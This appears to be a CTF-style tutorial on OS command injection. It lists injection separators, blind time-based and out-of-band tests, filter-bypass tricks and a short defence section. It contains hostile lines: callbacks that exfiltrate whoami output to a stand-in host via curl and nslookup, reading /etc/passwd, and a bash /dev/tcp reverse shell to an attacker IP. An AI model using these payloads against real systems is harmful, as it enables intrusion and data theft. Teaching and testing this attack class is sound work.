# Command injection

Command injection happens when user input ends up in a string that the server
hands to an OS shell. If you can add your own command to that string, you run
code on the host. It usually hides behind features that shell out: ping tools,
DNS lookups, file converters, "export to PDF", anything that smells like it
calls a system binary.

All examples are generic. Nothing here is the solution to a specific challenge.

## 1. Finding it

Take a parameter that might reach a shell and append a second command with a
separator:

```
; id
| id
& id
&& id
|| id
%0a id        (newline)
$(id)
`id`
```

`;`, newline and `$(...)` chain a command; `|` pipes; `&&`/`||` run on
success/failure. If the response shows `uid=...`, you have execution.

## 2. When you can't see the output (blind)

No command output in the page? Prove execution two ways:

**Time-based** — make the box wait:

```
; sleep 5
$(sleep 5)
& ping -c 5 127.0.0.1 &
```

A slow response = the command ran.

**Out-of-band** — make the box talk to you:

```
; curl http://YOUR-HOST/$(whoami)
; nslookup $(whoami).YOUR-COLLAB-DOMAIN
```

Watch your listener / Burp Collaborator for the callback, and you even exfil
data in the subdomain or path.

## 3. Getting the output back

If it's not blind, redirect the result somewhere you can read it:

```
; id > /var/www/html/out.txt       (then browse to it)
; cat /etc/passwd
```

## 4. Filter bypass

Common filters and ways around them:

- **Spaces blocked** — `${IFS}` is a space: `cat${IFS}/etc/passwd`; or
  `{cat,/etc/passwd}`; or `<` redirection.
- **Keywords blocked** — break them: `c""at`, `c\at`, `ca$@t`; or use globs:
  `/bin/c?t /etc/passwd`, `/???/??t /etc/passwd`.
- **Separators blocked** — try the ones not filtered (`%0a`, `$(...)`,
  backticks) or stack them.
- **Encoding** — URL-encode the payload, or have the target decode one:
  `$(echo aWQ=|base64 -d)`.

## 5. From execution to a shell

Once you have command execution, upgrade to a reverse shell:

```
; bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'
```

(listen with `nc -lvnp 4444`).

## 6. Defending

- **Don't call a shell** with user input. Use language APIs
  (`subprocess.run([...] , shell=False)`, parameterised calls) that pass
  arguments as a list, never a string the shell parses.
- If you truly must, **allow-list** exact values and reject everything else;
  escaping shell metacharacters by hand is a losing game.
- Run the service with least privilege so execution buys the attacker as little
  as possible.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
